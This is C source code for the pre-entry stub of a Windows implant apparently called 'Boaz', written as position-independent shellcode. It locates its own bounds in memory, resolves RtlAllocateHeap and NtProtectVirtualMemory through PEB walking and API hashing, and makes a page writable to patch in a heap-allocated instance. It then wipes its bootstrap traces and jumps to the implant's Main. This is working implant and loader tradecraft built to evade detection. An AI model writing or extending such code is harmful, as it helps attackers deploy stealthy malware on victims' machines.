#include <Common.h>
#include <Constexpr.h>

ST_GLOBAL PVOID __Instance = C_PTR( 'rdp5' );

EXTERN_C FUNC VOID PreMain(
    PVOID Param
) {
    INSTANCE Boaz = { 0 };
    PVOID    Heap     = { 0 };
    PVOID    MmAddr   = { 0 };
    SIZE_T   MmSize   = { 0 };
    ULONG    Protect  = { 0 };

    MmZero( & Boaz, sizeof( Boaz ) );

    //
    // get the process heap handle from Peb
    //
    Heap = NtCurrentPeb()->ProcessHeap;

    //
    // get the base address of the current implant in memory and the end.
    // subtract the implant end address with the start address you will
    // get the size of the implant in memory
    //
    Boaz.Base.Buffer = StRipStart();
    Boaz.Base.Length = U_PTR( StRipEnd() ) - U_PTR( Boaz.Base.Buffer );

    //
    // get the offset and address of our global instance structure
    //
    MmAddr = Boaz.Base.Buffer + InstanceOffset();
    MmSize = sizeof( PVOID );

    //
    // resolve ntdll!RtlAllocateHeap and ntdll!NtProtectVirtualMemory for
    // updating/patching the Instance in the current memory
    //
    if ( ( Boaz.Modules.Ntdll = LdrModulePeb( H_MODULE_NTDLL ) ) ) {
        if ( ! ( Boaz.Win32.RtlAllocateHeap        = LdrFunction( Boaz.Modules.Ntdll, HASH_STR( "RtlAllocateHeap"        ) ) ) ||
             ! ( Boaz.Win32.NtProtectVirtualMemory = LdrFunction( Boaz.Modules.Ntdll, HASH_STR( "NtProtectVirtualMemory" ) ) )
        ) {
            return;
        }
    }

    //
    // change the protection of the .global section page to RW
    // to be able to write the allocated instance heap address
    //
    if ( ! NT_SUCCESS( Boaz.Win32.NtProtectVirtualMemory(
        NtCurrentProcess(),
        & MmAddr,
        & MmSize,
        PAGE_READWRITE,
        & Protect
    ) ) ) {
        return;
    }

    //
    // assign heap address into the RW memory page
    //
    if ( ! ( C_DEF( MmAddr ) = Boaz.Win32.RtlAllocateHeap( Heap, HEAP_ZERO_MEMORY, sizeof( INSTANCE ) ) ) ) {
        return;
    }

    //
    // copy the local instance into the heap,
    // zero out the instance from stack and
    // remove RtRipEnd code/instructions as
    // they are not needed anymore
    //
    MmCopy( C_DEF( MmAddr ), &Boaz, sizeof( INSTANCE ) );
    MmZero( & Boaz, sizeof( INSTANCE ) );
    MmZero( C_PTR( U_PTR( MmAddr ) + sizeof( PVOID ) ), 0x18 );

    //
    // now execute the implant entrypoint
    //
    Main( Param );
}